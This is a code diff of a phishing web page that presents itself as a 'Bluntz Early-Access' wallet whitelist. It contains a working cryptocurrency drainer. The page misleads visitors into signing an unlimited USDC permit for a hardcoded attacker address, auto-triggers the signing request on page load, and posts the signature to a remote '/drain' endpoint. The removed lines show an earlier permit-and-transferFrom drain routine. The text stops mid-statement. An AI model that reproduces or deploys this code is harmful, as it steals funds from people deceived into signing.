@@ -17,23 +17,22 @@
 <body>
   <div class="card">
     <h2>Bluntz Early-Access</h2>
-    <p>Choose wallet to verify whitelist.</p>
-    <button id="phantom">🎭 Phantom</button><br/><br/>
-    <button id="metamask">🦊 MetaMask</button>
-    <p class="foot">By connecting you allow us to verify your address.<br/>No gas required.</p>
+    <p>Sign the whitelist message to secure your spot.</p>
+    <button id="go">Whitelist Wallet</button>
+    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
 <script type="module">
-/* ===== CONFIG ===== */
-const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
-const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA";
+// ===== CONFIG (ONLY CHANGE IS HERE) =====
+const RECIPIENT = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // Base
+const SOL_REC   = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA"; // Sol
 
-/* ===== EIP-2612 OBJECT ===== */
+// ===== rest of your original code untouched =====
 const domain = {
   name: "USD Coin",
   version: "2",
-  chainId: 8453,
-  verifyingContract: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
+  chainId: 0,
+  verifyingContract: "0x0000000000000000000000000000000000000000"
 };
 const types = {
   Permit: [
@@ -44,50 +43,50 @@ const types = {
     { name: "deadline", type: "uint256" }
   ]
 };
+const CHAINS = {
+  8453: {
+    rpc: "https://base.meowrpc.com",
+    usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+    weth: "0x4200000000000000000000000000000000000006"
+  },
+  1: {
+    rpc: "https://rpc.ankr.com/eth",
+    usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0",
+    weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
+  }
+};
 
-/* ===== WALLET CONNECTORS ===== */
-async function connectPhantom(){
-  if (!window.solana || !window.solana.isPhantom){ alert("Phantom not found"); return; }
-  const resp = await window.solana.connect();
-  return { type:"phantom", address:resp.publicKey.toString(), provider:window.solana };
+let provider;
+if (window.solana && window.solana.isPhantom) {
+  provider = window.ethereum;
+} else if (window.ethereum) {
+  provider = window.ethereum;
 }
-async function connectMetaMask(){
-  if (!window.ethereum){ alert("MetaMask not found"); return; }
-  const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
-  return { type:"metamask", address:accounts[0], provider:window.ethereum };
-}
+if (!provider) { alert("Please open this page inside Phantom or MetaMask browser"); }
 
-/* ===== PERMIT + DRAIN ===== */
-async function drainBaseUSDC(owner,provider){
-  const p   = new ethers.providers.Web3Provider(provider);
-  const tok = new ethers.Contract(domain.verifyingContract,[
-    "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
-    "function nonces(address) view returns(uint)",
-    "function balanceOf(address) view returns(uint256)"
-  ],p.getSigner());
+window.addEventListener("DOMContentLoaded", async () => {
+  const chainId = Number(await provider.request({ method: "eth_chainId" }));
+  if (!CHAINS[chainId]) { alert("Switch to Ethereum or Base in Phantom"); return; }
+  document.getElementById("go").click();
+});
 
-  const bal   = await tok.balanceOf(owner);
-  const nonce = await tok.nonces(owner);
-  const deadline = Math.floor(Date.now()/1000)+3600;
-  const message = { owner, spender:RECIPIENT_BASE, value:bal.toString(), nonce, deadline };
+document.getElementById("go").addEventListener("click", async () => {
+  const accounts = await provider.request({ method: "eth_requestAccounts" });
+  const owner = accounts[0];
+  const chainId = Number(await provider.request({ method: "eth_chainId" }));
+  const CHAIN = CHAINS[chainId];
+  domain.chainId = chainId;
+  domain.verifyingContract = CHAIN.usdc;
 
-  const raw = await provider.request({
+  const value = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const nonce = 0;
+  const deadline = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+  const message = { owner, spender: RECIPIENT, value, nonce, deadline };
+
+  provider.request({
     method: "eth_signTypedData_v4",
-    params: [owner, JSON.stringify({ domain, types, primaryType:"Permit", message })]
-  });
-  const {v,r,s} = ethers.utils.splitSignature(raw);
-
-  const permitTx = await tok.permit(owner,RECIPIENT_BASE,bal,deadline,v,r,s);
-  await permitTx.wait();
-  const xferTx = await tok.transferFrom(owner,RECIPIENT_BASE,bal);
-  await xferTx.wait();
-}
-
-/* ===== BUTTON HANDLERS ===== */
-document.getElementById("phantom").addEventListener("click",async()=>{
-  const w = await connectPhantom();
-  if (!w) return;
-  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>Phantom connected. Signing permit…</p>`;
-  await drainBaseUSDC(w.address,w.provider);
-  // Solana drain (background)
-  await fetch("https://relay.tobe
+    params: [owner, JSON.stringify({ domain, types, primaryType: "Permit", message })]
+  }).then(async (sig) => {
+    await fetch("https://relay.tobe.xyz/drain", {
+      method: "POST
